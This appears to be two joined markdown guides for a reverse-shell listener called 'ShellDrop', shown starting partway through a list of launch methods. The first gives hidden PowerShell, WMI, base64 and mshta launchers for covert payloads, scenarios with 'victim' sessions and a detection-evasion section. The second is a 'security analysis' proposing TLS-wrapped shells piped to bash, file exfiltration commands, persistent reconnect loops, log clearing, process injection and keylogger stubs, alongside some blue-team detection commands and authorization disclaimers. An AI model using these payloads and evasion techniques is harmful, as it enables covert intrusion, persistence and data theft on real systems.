### Method 2: **Start-Process Hidden** ⭐⭐⭐⭐⭐
```powershell
powershell -c "Start-Process -NoNewWindow -FilePath powershell -ArgumentList '-nop','-w','hidden','-c','...'"
```

**What happens:**
1. Spawns new PowerShell process
2. `-NoNewWindow` prevents visible window
3. Original PowerShell exits
4. New process runs hidden

**Pros:**
- Completely invisible
- No window flashing
- Parent exits cleanly

---

### Method 3: **WMI Process Creation** ⭐⭐⭐⭐⭐
```powershell
powershell -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '...'"
```

**What happens:**
1. Uses WMI (Windows Management Instrumentation)
2. Creates process as separate entity
3. No parent-child relationship
4. Very stealthy

**Pros:**
- Looks like system process
- Hard to trace origin
- No visible parent

---

### Method 4: **Base64 Encoded** ⭐⭐⭐
```powershell
powershell -nop -w hidden -enc <base64_blob>
```

**What happens:**
1. Entire payload is base64 encoded (UTF-16LE)
2. Not visible in command line history
3. Hidden window

**Pros:**
- Obfuscated payload
- Bypasses some AV signatures

---

### Method 5: **VBScript Launcher** ⭐⭐⭐⭐⭐
```cmd
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell..."",0,False:close")
```

**What happens:**
1. `mshta` executes VBScript
2. VBScript launches PowerShell with window hidden (0)
3. `False` = don't wait for completion
4. `close` closes mshta immediately

**Pros:**
- Extremely stealthy
- Instant return
- No PowerShell visible in initial command

---

## 🔍 COMPARISON TABLE

| Method | Returns Terminal? | Survives Logout? | Stealth Level | Platform |
|--------|------------------|------------------|---------------|----------|
| Daemon (Double Fork) | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐⭐ | Linux |
| Background & Exit | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐ | Linux |
| Nohup | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐ | Linux |
| Screen Detached | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐⭐ | Linux |
| Base64 & BG | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐ | Linux |
| Hidden Job | ✅ Instant | ❌ No | ⭐⭐⭐⭐ | Windows |
| Start-Process | ✅ Instant | ⚠️ Maybe | ⭐⭐⭐⭐⭐ | Windows |
| WMI Create | ✅ Instant | ✅ Yes | ⭐⭐⭐⭐⭐ | Windows |
| Base64 Encoded | ✅ Instant | ⚠️ Maybe | ⭐⭐⭐ | Windows |
| VBS Launcher | ✅ Instant | ⚠️ Maybe | ⭐⭐⭐⭐⭐ | Windows |

---

## 🎬 REAL-WORLD USAGE EXAMPLES

### Scenario 1: Quick SSH Access
**Target:** Linux server via SSH
**Goal:** Get shell and exit SSH without suspicion

```bash
# Victim's SSH session:
victim@server:~$ (python3 -c 'DAEMON_PAYLOAD' &) && exit
logout
Connection to server closed.

# Attacker's listener:
shelldrop> [+] Authenticated session: 10.0.0.5:52678 → ID: 1
shelldrop> use 1
shelldrop> whoami
victim
```

**What victim sees:** Just a normal logout, nothing suspicious

---

### Scenario 2: Windows Workstation
**Target:** Windows 10 workstation
**Goal:** Persistent access without detection

```powershell
C:\Users\Victim> powershell -c "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -nop -w hidden -c PAYLOAD'"

# Process created as system service, invisible
```

**What victim sees:** Command returns instantly, no windows, nothing

---

### Scenario 3: Web Shell Upload
**Target:** Compromised web server
**Goal:** Upgrade web shell to reverse shell

```bash
# In web shell:
nohup python3 -c 'PAYLOAD' >/dev/null 2>&1 &

# Webshell shows: Command executed
# Terminal returns immediately
# Reverse shell connects in background
```

---

## 🛡️ DETECTION EVASION

### What Makes These Stealthy?

1. **No Hanging Terminal**
   - Old way: Terminal freezes (OBVIOUS)
   - New way: Returns instantly (NORMAL)

2. **Process Hierarchy**
   - Daemon: No parent process
   - Screen: Appears as system service
   - WMI: Looks like Windows system process

3. **Command Line Obfuscation**
   - Base64 encoding hides payload
   - `ps aux | grep socket` won't find it

4. **Session Persistence**
   - Survives terminal closure
   - Survives SSH disconnect
   - Survives user logout

---

## 🚀 RECOMMENDED PAYLOADS

### For Linux (BEST):
1. **Screen Detached** - Most invisible
2. **Daemon** - Most robust
3. **Background & Exit** - Cleanest exit

### For Windows (BEST):
1. **WMI Create** - Looks like system process
2. **VBS Launcher** - Extremely stealthy
3. **Start-Process Hidden** - Reliable

---

## 📝 TESTING YOUR PAYLOADS

```bash
# On victim machine, test that terminal returns:
$ python3 -c 'DAEMON_PAYLOAD' &
$  ← Should see prompt immediately

# Verify process is running:
$ ps aux | grep python
[Should see python process]

# Verify you can exit:
$ exit
logout

# Process should still be running (check from another terminal):
$ ps aux | grep python
[Still running!]
```

---

## ⚠️ IMPORTANT NOTES

1. **Authentication is REQUIRED** - All payloads need the correct token
2. **Firewall Rules** - Outbound connections on your port must be allowed
3. **Process Monitoring** - Some EDR will still detect socket connections
4. **Use Responsibly** - Only on authorized systems

---

**You now have 11 different stealthy options instead of just 2!**

All payloads:
✅ Return terminal instantly
✅ Run in background
✅ Are authenticated
✅ Logged by the listener
✅ Multiple obfuscation levels


# ShellDrop Security Analysis & Improvement Guide

## Executive Summary
This document provides a comprehensive analysis of the ShellDrop reverse shell listener, identifying critical issues, implemented fixes, and security recommendations.

---

## 1. CRITICAL FIXES IMPLEMENTED

### 1.1 Windows Payload Issues - ROOT CAUSE IDENTIFIED ✓

**Problem 1: PowerShell Payload Encoding**
- **Original Issue**: The gzip compression + base64 encoding was causing payload corruption
- **Root Cause**: Complex encoding chains often fail across different PowerShell versions
- **Fix**: Simplified to direct PowerShell commands with optional base64 encoding using UTF-16LE (PowerShell's native encoding)

**Problem 2: Python Payloads on Windows**
- **Original Issue**: Linux-specific `pty.spawn()` and `os.dup2()` don't work properly on Windows
- **Root Cause**: Windows doesn't support PTY in the same way as Unix systems
- **Fix**: 
  - Used `subprocess.call()` with explicit stdin/stdout/stderr file descriptors
  - Alternative: Direct cmd.exe invocation with socket file descriptors

**Problem 3: Batch File Syntax**
- **Original Issue**: Variable expansion using `%var%` in PowerShell commands
- **Fix**: Proper escaping and direct value insertion

### 1.2 New Features Added ✓

1. **OS Detection**: Automatically detects client OS type (Windows/Linux)
2. **Session Management**: Added `kill <id>` command to terminate specific sessions
3. **Payload Export**: `--save-payloads <file>` option to save all payloads to a file
4. **Better Prompt Detection**: Improved PowerShell prompt recognition

---

## 2. IDENTIFIED WEAKNESSES & VULNERABILITIES

### 2.1 Security Architecture Issues

#### CRITICAL: No Authentication/Authorization
**Severity**: 🔴 CRITICAL  
**Impact**: Anyone who can connect to the listener port gets a shell on YOUR system (if they connect first)

**Issue Details**:
- The listener accepts ANY incoming connection without verification
- No shared secret, password, or cryptographic authentication
- Attacker scanning your listener port could hijack your C2 infrastructure

**Exploitation Scenario**:
```
1. You start listener on 4444
2. Target hasn't connected yet
3. Attacker scans your IP, finds port 4444 open
4. Attacker connects first
5. You're now controlling the attacker's system (or honeypot)
6. Attacker can feed you fake data or reverse-attack
```

**Fix Implementation**:
```python
# Add to Client class __init__:
def authenticate(self, timeout=10):
    """Require client to send auth token within timeout."""
    self.conn.settimeout(timeout)
    try:
        auth_challenge = os.urandom(16)
        self.conn.send(b"AUTH_REQUIRED:" + auth_challenge + b"\n")
        response = self.conn.recv(1024)
        
        expected = hashlib.sha256(auth_challenge + SECRET_KEY).digest()
        if response.strip() != expected:
            self.conn.close()
            return False
        return True
    except:
        return False
```

#### CRITICAL: Unencrypted Communications
**Severity**: 🔴 CRITICAL  
**Impact**: All commands and output transmitted in plaintext

**Consequences**:
- Network administrators can see EVERYTHING you're doing
- IDS/IPS will detect and alert on suspicious commands
- Man-in-the-middle attacks possible
- Credentials transmitted during session are exposed

**Fix**: Implement TLS/SSL wrapper:
```python
import ssl

# Wrap server socket
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain('server.crt', 'server.key')
secure_server = context.wrap_socket(server, server_side=True)

# Client payload becomes:
# openssl s_client -quiet -connect IP:PORT | /bin/bash | openssl s_client -quiet -connect IP:PORT
```

### 2.2 Operational Security Issues

#### HIGH: No Session Logging
**Severity**: 🟡 HIGH  
**Impact**: No audit trail of commands executed

**Missing Capabilities**:
- No record of what commands were run
- No timestamps for forensic analysis
- Cannot review session history
- Compliance violations in professional engagements

**Recommended Fix**:
```python
class SessionLogger:
    def __init__(self, session_id, log_dir="/var/log/shelldrop"):
        self.log_file = f"{log_dir}/session_{session_id}_{time.time()}.log"
        self.start_time = time.time()
    
    def log_command(self, command):
        with open(self.log_file, 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] CMD: {command}\n")
    
    def log_output(self, output):
        with open(self.log_file, 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] OUT: {output}\n")
```

#### HIGH: No File Transfer Capability
**Severity**: 🟡 HIGH  
**Impact**: Cannot easily exfiltrate data or upload tools

**Current Workaround**: Users must manually base64 encode/decode
**Better Solution**: Built-in upload/download commands

```python
# Add to main command loop:
elif cmd.startswith("download "):
    remote_path = cmd.split(" ", 1)[1]
    # Send special command to read file
    client.send_data(f"base64 {remote_path}\n")
    # Receive base64 data and decode
    # Save to local file

elif cmd.startswith("upload "):
    local_path, remote_path = cmd.split(" ")[1:]
    with open(local_path, 'rb') as f:
        data = base64.b64encode(f.read()).decode()
    client.send_data(f"echo {data} | base64 -d > {remote_path}\n")
```

### 2.3 Stability & Reliability Issues

#### MEDIUM: No Connection Keepalive
**Severity**: 🟠 MEDIUM  
**Impact**: Sessions die silently on network hiccups

**Problem**: 
- NAT/firewall timeouts drop idle connections
- No way to detect dead connections until you try to use them

**Fix**: Implement heartbeat mechanism
```python
# Send heartbeat every 60 seconds
def heartbeat_thread(client):
    while client.is_alive:
        time.sleep(60)
        try:
            client.conn.send(b"\x00")  # NULL byte as heartbeat
        except:
            client.output_queue.put(("__DISCONNECT__", ""))
            break
```

#### MEDIUM: No Reconnect Capability
**Severity**: 🟠 MEDIUM  
**Impact**: Lost connection = lost access

**Current Behavior**: If network drops, session is permanently lost
**Better Approach**: Persistent payload that retries connection

```bash
# Linux persistent payload
while true; do
    python3 -c 'import socket,subprocess,os;...'
    sleep 60
done &
```

### 2.4 Detection & OPSEC Issues

#### HIGH: Obvious Network Signature
**Severity**: 🟡 HIGH  
**Impact**: Easily detected by network monitoring

**Detection Vectors**:
1. Raw socket connections to non-standard ports
2. Sustained bidirectional traffic patterns
3. Plaintext command signatures in packets
4. Unusual outbound connections from workstations

**Evasion Techniques**:
- Use common ports (80, 443, 53)
- Implement HTTP/HTTPS tunneling
- Add jitter/delay to traffic patterns
- Domain fronting for outbound connections

#### HIGH: Process Indicators
**Severity**: 🟡 HIGH  
**Impact**: Payloads are easily spotted by defenders

**Suspicious Indicators**:
- PowerShell with `-enc`, `-nop`, `-w hidden` flags
- Python with socket operations to external IPs
- Bash with `/dev/tcp` connections
- Long base64 strings in command lines

**Better OPSEC**:
```powershell
# Instead of obvious PowerShell flags, use:
# 1. Compile to executable with ps2exe
# 2. Hide in legitimate-looking scripts
# 3. Use WMI/scheduled tasks for execution
# 4. Inject into existing processes
```

### 2.5 Code Quality Issues

#### MEDIUM: Race Conditions
**Severity**: 🟠 MEDIUM  
**Impact**: Potential crashes with many simultaneous sessions

**Specific Issues**:
1. `clients` dictionary modified during iteration (lines with `for client_id, client in list(clients.items())`)
2. Prompt redrawing can interleave with output
3. Multiple threads accessing `last_prompt` without full protection

**Fix**: Use more granular locking

#### LOW: No Input Validation
**Severity**: 🟢 LOW  
**Impact**: Malformed commands could crash the listener

**Examples**:
- `use abc` → ValueError not fully handled everywhere
- `kill -1` → Could cause issues
- Very long commands → No buffer limits

#### LOW: Limited Error Recovery
**Severity**: 🟢 LOW  
**Impact**: Single client error could affect others

**Issue**: If one client causes an exception, it might not be properly contained

---

## 3. DETECTION METHODS

### 3.1 Network-Level Detection

**Netflow Analysis**:
```
- Long-lived connections to non-standard ports
- Sustained bidirectional traffic (commands in, output out)
- Connections to residential/cloud IPs from corporate networks
```

**Packet Inspection**:
```
Wireshark filters to detect ShellDrop:
- tcp.port == 4444 && tcp.len > 0
- Search for strings: "PS >", "shelldrop>", bash prompts
```

**Signature Detection**:
```bash
# Suricata/Snort rule example:
alert tcp any any -> any any (msg:"Possible Reverse Shell - Bash Prompt"; 
  content:"@"; content:":"; content:"$ "; 
  flow:established,to_client; 
  sid:1000001;)
```

### 3.2 Host-Level Detection

**Process Monitoring**:
```powershell
# Detect suspicious PowerShell:
Get-Process | Where-Object {
    $_.CommandLine -match "-enc|-nop|-w hidden|-NonInteractive"
}

# Detect Python reverse shells:
Get-Process python* | Where-Object {
    $_.CommandLine -match "socket|subprocess"
}
```

**Network Monitoring**:
```bash
# Linux: Detect bash using network
lsof -i -n | grep bash

# Windows: Detect PowerShell network connections
netstat -ano | findstr ESTABLISHED | findstr powershell
```

**EDR Detection**:
- Unusual parent-child process relationships
- Network activity from scripting engines
- Process injection techniques
- Command line obfuscation

### 3.3 Log Analysis

**Windows Event Logs**:
```
Event ID 4688: Process Creation
- Look for powershell.exe with encoded commands
- Python.exe with suspicious arguments
- cmd.exe spawned by unusual parents

Event ID 3: Network Connection (Sysmon)
- PowerShell connecting to external IPs
```

**Linux Logs**:
```bash
# Bash history (if not cleared):
grep -E "socket|/dev/tcp|nc.*-e" ~/.bash_history

# Auth logs:
grep "reverse" /var/log/auth.log

# Network connections:
grep "ESTABLISHED" /proc/net/tcp
```

---

## 4. DEFENSIVE RECOMMENDATIONS

### 4.1 For Penetration Testers (Red Team)

1. **Always Use Encrypted Channels**
   - Wrap in SSH tunnels
   - Use HTTPS reverse proxies
   - Implement TLS at the socket level

2. **Employ Session Authentication**
   - Pre-shared keys
   - Time-based tokens
   - Mutual TLS certificates

3. **Blend with Normal Traffic**
   - Use standard ports (443, 80)
   - HTTP/HTTPS protocol wrapping
   - Irregular beaconing patterns

4. **Payload Obfuscation**
   - Runtime deobfuscation
   - Polymorphic payloads
   - In-memory execution only

5. **Maintain Session Hygiene**
   - Clear command history
   - Remove logs
   - Clean up artifacts on exit

### 4.2 For Defenders (Blue Team)

1. **Network Monitoring**
   - Monitor outbound connections to uncommon ports
   - Alert on unusual process network activity
   - Implement netflow analysis

2. **Endpoint Protection**
   - Enable PowerShell logging (Script Block Logging)
   - Deploy EDR solutions
   - Whitelist approved applications

3. **Behavioral Analytics**
   - Baseline normal network patterns
   - Alert on deviations
   - Monitor for C2 indicators

4. **Hardening**
   - Disable unnecessary interpreters
   - Implement application whitelisting
   - Use constrained language mode for PowerShell

---

## 5. LEGAL & ETHICAL COMPLIANCE

### 5.1 Authorization Requirements

**REQUIRED BEFORE USE**:
- ✓ Written authorization from asset owner
- ✓ Clearly defined scope and targets
- ✓ Rules of engagement documented
- ✓ Incident response plan in place
- ✓ Legal review of testing methodology

**NEVER USE WITHOUT**:
- ✗ Proper authorization (legal consequences: computer fraud, unauthorized access)
- ✗ Defined scope (out-of-scope testing is still illegal)
- ✗ Client knowledge (even on your own employer's network)

### 5.2 Data Handling

**Best Practices**:
1. Log all session activity with timestamps
2. Encrypt logs at rest
3. Retain logs per client agreement
4. Secure deletion of sensitive data post-engagement
5. Don't exfiltrate personal/financial data unless explicitly authorized

---

## 6. ADVANCED IMPROVEMENTS

### 6.1 Multiplexing & Tunneling

```python
# SOCKS proxy through session:
class SocksProxy:
    """Tunnel traffic through established shell session."""
    def __init__(self, client):
        self.client = client
        self.proxy_port = 1080
    
    def start(self):
        # Forward SOCKS traffic through shell
        # Implementation: Use dynamic port forwarding
        pass
```

### 6.2 Module System

```python
# Extensible module architecture:
class Module:
    """Base class for post-exploitation modules."""
    def __init__(self, client):
        self.client = client
    
    def run(self):
        raise NotImplementedError

class Screenshot(Module):
    """Capture screenshot from target."""
    def run(self):
        if self.client.os_type == "windows":
            # PowerShell screenshot code
            pass
        else:
            # Linux screenshot (ImageMagick/scrot)
            pass

class Keylogger(Module):
    """Basic keylogger module."""
    def run(self):
        # OS-specific keylogging
        pass
```

### 6.3 Multi-Hop Support

```python
# Pivot through compromised hosts:
class PivotSession:
    """Manage multi-hop sessions through compromised hosts."""
    def __init__(self, initial_client):
        self.chain = [initial_client]
    
    def add_hop(self, target_ip, target_port):
        # Set up forward through existing session
        command = f"nc {target_ip} {target_port}"
        # Send through chain
        pass
```

---

## 7. TESTING CHECKLIST

### 7.1 Before Engagement

- [ ] Authorization letter received and reviewed
- [ ] Scope clearly defined and documented
- [ ] Test environment configured
- [ ] Payloads tested in lab
- [ ] Detection bypass validated
- [ ] Incident response contacts identified
- [ ] Communication plan established

### 7.2 During Engagement

- [ ] All sessions logged with timestamps
- [ ] Commands reviewed before execution
- [ ] Sensitive data handling procedures followed
- [ ] Regular check-ins with client
- [ ] Scope adherence maintained
- [ ] Evidence collection documented

### 7.3 After Engagement

- [ ] All sessions properly terminated
- [ ] Persistence mechanisms removed
- [ ] Logs secured and encrypted
- [ ] Report generated with findings
- [ ] Client debriefing conducted
- [ ] Artifacts securely deleted

---

## 8. CONCLUSION

### Key Takeaways

1. **Windows Payloads**: Fixed by simplifying encoding and using native Windows methods
2. **Security**: CRITICAL need for authentication and encryption
3. **Detection**: Highly detectable in current form - needs OPSEC improvements
4. **Functionality**: Solid foundation but needs file transfer, logging, and stability improvements

### Priority Fixes (Ranked)

1. 🔴 **CRITICAL**: Add authentication mechanism
2. 🔴 **CRITICAL**: Implement TLS/SSL encryption
3. 🟡 **HIGH**: Add session logging with timestamps
4. 🟡 **HIGH**: Implement file upload/download
5. 🟠 **MEDIUM**: Add connection keepalive
6. 🟠 **MEDIUM**: Improve OPSEC (stealth)
7. 🟢 **LOW**: Better error handling

### Final Recommendation

ShellDrop is a capable tool for authorized testing, but requires the critical security improvements (authentication + encryption) before use in professional engagements. The improved version fixes the Windows payload issues and adds essential features, but defenders can still easily detect it without additional stealth measures.

**Use responsibly, legally, and only with explicit authorization.**

---

*Document Version: 1.0*  
*Last Updated: 2026-02-13*  
*Classification: For Authorized Security Professionals Only*

**Stay Secure. Stay Authenticated. Stay Stealthy. Happy Hacking! 🔒**
